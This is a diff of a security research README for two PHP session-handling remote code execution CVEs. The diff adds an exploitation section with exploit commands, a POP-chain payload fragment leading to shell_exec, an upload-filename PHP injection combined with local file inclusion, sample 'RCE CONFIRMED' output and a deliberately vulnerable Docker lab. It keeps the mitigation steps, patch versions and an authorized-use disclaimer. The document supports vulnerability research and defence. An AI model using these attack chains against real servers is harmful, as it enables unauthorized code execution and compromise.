@@ -1,6 +1,6 @@
 # PHP2Shell — CVE-2026-109618 / CVE-2026-109619
 
-Independent analysis and defensive tooling for two critical pre-auth RCE vulnerabilities in PHP core's session handling.
+Independent analysis, exploitation PoCs, and defensive tooling for two critical pre-auth RCE vulnerabilities in PHP core's session handling.
 
 **CVSS v4.0: 9.2 (Critical)** — Pre-auth, no user interaction, arbitrary code execution.
 
@@ -31,6 +31,86 @@ Two heap use-after-free bugs in PHP's `ext/session/session.c`:
 | 3 | Serializer mismatch → `__destruct` | Deserialization | **No** | Per-directory serializer config + POP gadget |
 | 4 | var_destroy reentry UAF | Memory corruption | **No** | Object with `__destruct` re-entering session system |
 | 5 | Session fixation via POST body | Logic bug | Yes | Bypasses `session.use_only_cookies` |
+
+## Exploitation PoCs
+
+### Quick Start
+
+```bash
+# Start the vulnerable environment
+cd environment && docker compose up -d
+
+# CVE-2026-109618: serializer mismatch → POP chain → RCE
+python3 poc/exploit_cve_2026_109618.py http://localhost:8080
+
+# CVE-2026-109619: session file injection + LFI → RCE
+python3 poc/exploit_cve_2026_109619.py http://localhost:8080/index.php --mode inject -c id
+
+# CVE-2026-109619: UAF crash detection
+python3 poc/exploit_cve_2026_109619.py http://localhost:8080/index.php --mode detect
+
+# CVE-2026-109619: heap spray primitive demonstration
+python3 poc/exploit_cve_2026_109619.py http://localhost:8080/index.php --mode spray
+
+# Cleanup
+cd environment && docker compose down -v
+```
+
+### CVE-2026-109618 — Serializer Mismatch → RCE
+
+`poc/exploit_cve_2026_109618.py` exploits the `PS(serializer)` leak between FPM requests.  The attack does NOT require `session.upload_progress.enabled`.
+
+1. **Write** — POST to a `php_serialize` endpoint stores a pipe-prefixed POP chain in the session file: `|O:6:"Logger":1:{s:7:"handler";O:14:"CommandHandler":...}`
+2. **Trigger** — GET to a `php` (default) endpoint: the deserializer splits on `|`, unserializes the objects, and `__destruct` fires the chain → `shell_exec()`.
+
+```
+$ python3 poc/exploit_cve_2026_109618.py http://localhost:8080 -c "cat /etc/hostname"
+[*] Target:  http://localhost:8080
+[*] Command: cat /etc/hostname
+[1] Creating session via php_serialize endpoint...
+[2] Writing POP chain to session (php_serialize format)...
+[3] Triggering deserialization via php serializer endpoint...
+[4] Checking command execution...
+[+] RCE CONFIRMED
+
+    a1b2c3d4e5f6
+```
+
+Options: `--admin-path`, `--trigger-path`, `--output-file`, `-v` for verbose.
+
+### CVE-2026-109619 — Upload Progress UAF → RCE
+
+`poc/exploit_cve_2026_109619.py` has three modes:
+
+| Mode | What it does | Reliability |
+|------|-------------|-------------|
+| `detect` | Sends crafted multipart to trigger UAF crash (segfault / 502) | High |
+| `inject` | Injects PHP code via upload filename + LFI inclusion → RCE | High (needs LFI) |
+| `spray` | Heap spray to demonstrate the controlled-write primitive | Medium (timing) |
+
+The `inject` mode is the simplest RCE path: upload_progress stores the raw filename in the session file without sanitization.  A filename containing `<?php system(...) ?>` combined with a Local File Inclusion vulnerability gives code execution.
+
+The `spray` mode demonstrates the heap feng shui technique from the ANALYSIS.md — form fields sized to reclaim the freed HashTable chunk, with the stale `Z_LVAL_P` write landing on attacker-controlled memory.  Full RCE via this path requires build-specific offsets (see `docs/ANALYSIS.md` §8).
+
+Options: `--mode`, `-c` command, `--rate`, `--spray-count`, `--spray-size`, `--lfi-path`.
+
+### Docker Test Environment
+
+`environment/` contains a deliberately vulnerable PHP 8.1 + nginx setup:
+
+- **PHP 8.1-fpm** (EOL, no patch available) with `upload_progress.enabled = On`
+- **nginx** with `fastcgi_request_buffering off` (allows slow-send exploitation)
+- **Single FPM worker** (`pm.max_children = 1`) to guarantee serializer persistence
+- **Per-directory serializer mismatch** (`/` uses `php`, `/admin/` uses `php_serialize`)
+- **POP gadget classes** (Logger → CommandHandler → shell_exec)
+- **LFI endpoint** (`/lfi.php`) for session file inclusion
+
+```bash
+cd environment
+docker compose up -d    # start
+docker compose logs -f  # watch logs
+docker compose down -v  # stop + cleanup
+```
 
 ## Immediate Mitigation
 
@@ -68,22 +148,7 @@ session.use_only_cookies = On
 
 Upgrade to PHP **8.2.35**, **8.3.36**, **8.4.27**, or **8.5.12** (released 2026-10-21).
 
-## Repository Structure
-
-```
-docs/
-  ANALYSIS.md             — Full technical deep-dive (vulnerability mechanics, code paths,
-                            exploitation primitives, all five findings)
-poc/
-  poc_trigger.py          — Defensive UAF trigger: sends a crafted multipart POST to detect
-                            if a target is vulnerable to CVE-2026-109619 (crash = vulnerable)
-mitigation/
-  check_mitigation.sh     — Server audit script: checks all installed PHP binaries for
-                            patch status, upload_progress config, INI scope, guard extension,
-                            serializer consistency, and FPM pool hardening
-```
-
-## Usage
+## Defensive Tooling
 
 ### Check if your server is mitigated
 
@@ -92,19 +157,34 @@ chmod +x mitigation/check_mitigation.sh
 sudo ./mitigation/check_mitigation.sh
 ```
 
-### Test a target for CVE-2026-109619 (authorized testing only)
+### Crash detection (legacy — use exploit_cve_2026_109619.py --mode detect instead)
 
 ```bash
 python3 poc/poc_trigger.py https://your-server.example.com/index.php
 ```
 
-Options:
-- `--dry-run` — Build the payload without sending
-- `--rate 16384` — Slower send rate (bytes/s) to ensure throttle trigger
-- `--spray 149` — Number of heap spray fields
-- `--cookie PHPSESSID=abc123` — Existing session cookie
+## Repository Structure
 
-A connection reset or 502 indicates the PHP worker crashed (vulnerable). A 200 OK means the target is either mitigated or the timing was insufficient.
+```
+poc/
+  exploit_cve_2026_109618.py  — Serializer mismatch → POP chain → RCE
+  exploit_cve_2026_109619.py  — Upload progress: detect / inject+LFI / heap spray
+  poc_trigger.py              — Original crash-detection trigger
+
+environment/
+  docker-compose.yml          — Orchestration: PHP-FPM + nginx
+  Dockerfile                  — PHP 8.1-fpm vulnerable build
+  nginx/default.conf          — fastcgi_request_buffering off
+  www/                        — Vulnerable application with gadget classes
+
+docs/
+  ANALYSIS.md                 — Full technical deep-dive (vulnerability mechanics,
+                                code paths, exploitation primitives, all five findings)
+
+mitigation/
+  check_mitigation.sh         — Server audit: patch status, upload_progress config,
+                                INI scope, guard extension, serializer consistency
+```
 
 ## Key Technical Details
 
@@ -135,7 +215,9 @@ Three independent defects combine:
 
 ## Disclaimer
 
-This research is for **authorized security testing and educational purposes only**. Do not use against systems you do not own or have explicit written authorization to test. The PoC trigger is designed for crash detection (defensive verification), not exploitation.
+This repository is for **authorized security testing and educational purposes only**. Do not use against systems you do not own or have explicit written authorization to test.
+
+The exploitation PoCs demonstrate real attack chains against a **self-contained Docker environment**. Running them against production systems without authorization is illegal in most jurisdictions.
 
 ## References
 
